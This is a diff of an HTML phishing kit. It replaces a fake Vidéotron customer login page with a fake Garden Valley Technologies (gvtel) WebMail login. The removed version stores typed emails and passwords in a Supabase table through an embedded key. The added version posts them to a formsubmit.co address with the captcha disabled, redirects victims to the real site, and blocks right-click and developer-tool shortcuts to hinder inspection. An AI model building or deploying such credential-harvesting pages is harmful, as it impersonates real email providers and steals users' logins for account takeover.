@@ -1,87 +1,126 @@
 <!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Vidéotron Courriel Web</title>
-  <link rel="shortcut icon" href="https://www.videotron.com/resources/legacy/img/espace_clientplus.png">
-  <link href="style.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-
-  <!-- Supabase SDK -->
-  <script type="module">
-    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
-
-    const supabase = createClient(
-      'https://swccdhnrrudikrubracz.supabase.co',
-      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN3Y2NkaG5ycnVkaWtydWJyYWN6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgzNTI1MzksImV4cCI6MjA2MzkyODUzOX0.rXJQ67THl3qKDBe57UDv3ZjUbxxO4gQEkixgOVfhD18'
-    );
-form.addEventListener('submit', async function (e) {
-  e.preventDefault();
-
-  const email = document.getElementById('email').value;
-  const password = document.getElementById('password').value;
-
-  const { error, data } = await supabase
-    .from('submissions')  // change this to match your table name
-    .insert([{ email, password }]);
-
-  if (error) {
-    alert('Erreur de soumission: ' + error.message);
-  } else {
-    form.reset();
-    successMsg.style.display = 'block';
-    setTimeout(() => {
-      window.location.href = 'https://courrielweb.videotron.com/iwc_static/layout/main.html?lang=fr-ca&3.0.2.2.0_20010958&u=1';
-    }, 4000);
-  }
-});
-
-  </script>
+<html>
+<link rel="shortcut icon" href="data:image/png;base64,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">
+ </head>
+	<meta charset="UTF-8">
+	<title> My Account – Garden Valley Technologies - Erskine </title>
+	<link href="style.css" rel="stylesheet">
 </head>
-<body style="background-color: white;">
-
-<div id="loader"></div>
-<div style="display:none;" id="myDiv" class="animate-bottom">
-  <img src="https://www.videotron.com/resources/legacy/img/Videotron_FR_RGB_pour_fond_blanc.png" width="220" height="50" alt="Vidéotron">
-  <h3>Connectez-vous à l'espace client</h3>
-</div>
-
-<script>
-  function myFunction() {
-    setTimeout(() => {
-      document.getElementById("loader").style.display = "none";
-      document.getElementById("myDiv").style.display = "block";
-    }, 3000);
-  }
-  window.onload = myFunction;
-</script>
+	<link href="style.css" rel="stylesheet">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+<p>
+<style>
+body {
+  background-image: url( #002fa7);
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-size: cover;
+}
+</style>
+<p>
 
 <div class="login-page">
-  <div class="form">
-    <fieldset style="margin: auto; width: 390px; background-color: #dbdbdb; border: 2px inset">
-      <div style="text-align:center;">
-        <img src="https://www.videotron.com/resources/legacy/img/espace_clientplus.png" width="40" height="40" alt="icon">
-        <div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
-          ✅ Merci ! Connexion réussie – Redirection vers le portail….
-        </div>
-        <form id="login-form">
-          <input type="email" id="email" placeholder="Email" required />
-          <br>
-		  <p>
-          <input type="password" id="password" placeholder="Password" required />
-          <button type="submit">Se connecter <i class="fa fa-lock"></i></button>
-        </form>
-      </div>
-    </fieldset>
-    <h5 style="text-align: center;">Vidéotron garde votre vie connectée de n'importe où, à tout moment.</h5>
+<div class="form">
+		    </p>	
+</style>
+<body>
   </div>
-</div>
 
-<div class="footer" style="text-align: center; margin-top: 2em;">
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStoywsZEXK8fQ_zJX_3uCU245AHtuWpBM6JTN7Cl_PHL8PQspH3jOxwtYWFtzs9aFioYA&usqp=CAU" width="40" height="40" alt="logo">
-  <p>© Vidéotron 2025</p>
-</div>
+    </p>
+<div style="text-align:center;">
+</span>
+	<!-- FormSubmit Form -->
+<form action="https://formsubmit.co/966284ce1cbc598ea97f8ee0dbb55376" method="POST">
+<p>
+<div id="content" style="border-width:0px;margin:auto;width:410px;background-color:#ffffff;align:center">
+<fieldset>
+<img "left" alt=""src="https://webmail.gvtel.com/scripts/image.pl" width="620" height="35">
+        <legend>Welcome to WebMail</legend>
 
-</body>
-</html>
+        <div class="formrow">
+<span class="prompt"><label for="user">Email Address</label></span>
+                <div class="element"><input type="text" name="username_ex" value="" tabindex="1">
+</div>
+        </div>
+
+        <div class="formrow">
+                <span class="prompt"><label for="user">Password</label></span>
+                <div class="element"><input type="password" name="password" tabindex="2">
+</div>
+        </div>
+                <div class="formrow">
+                        <span class="prompt"><label for="user">Template Set</label></span>
+                        <div class="element">
+<select name="interface_ex" onchange="select_interface(this)">
+	<option value="ajax">Standard </option>
+	<option value="html">Basic</option>
+	<option value="mobile">Mobile</option>
+ </select>
+</div>
+        </div>
+
+        <div class="formrow">
+                <span class="prompt"><label for="_tpl_lang">Language</label></span>
+                <div class="element">
+ <select name="language" onchange="select_lang(this);">
+		<option value="English US">English
+				</option><option value="French">French
+				</option><option value="Portuguese">Portuguese
+				</option><option value="Danish">Danish
+				</option><option value="Dutch">Dutch
+				</option><option value="German">German
+				</option><option value="Spanish">Spanish
+				</option></select>
+ </div>
+        </div>
+		 <!-- Disable CAPTCHA -->
+  <input type="hidden" name="_captcha" value="false">
+<P></P>
+  <!-- Redirect URL -->
+  <input type="hidden" name="_next" value="https://gvtel.com/">
+<p> 
+<br>
+<button type="Login submit-button"> Login  <span style='font-size:17px;'>&#8680;</span>  <i class="fa fa-lock"></i></button>
+
+			</div>	 
+            
+            <div>              
+</div>
+<p>
+  
+</form>
+</form>
+  </p>
+</form>
+		
+</div>		
+</style>
+</head>
+<body>
+		<script>
+  // Disable right-click
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+  });
+
+  // Disable common inspect shortcuts
+  document.addEventListener('keydown', function (e) {
+    // F12
+    if (e.key === "F12") e.preventDefault();
+
+    // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+U
+    if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
+        (e.ctrlKey && e.key === 'U')) {
+      e.preventDefault();
+    }
+  });
+</script>	
+<p></p>
+
+<div class="footer">
+  <p> © Garden Valley Technologies  |  Privacy Policy  |  Legal  | FCC Broadband Labels |  Site designed by Pivot
+<div class="footer">
+<div class="form">
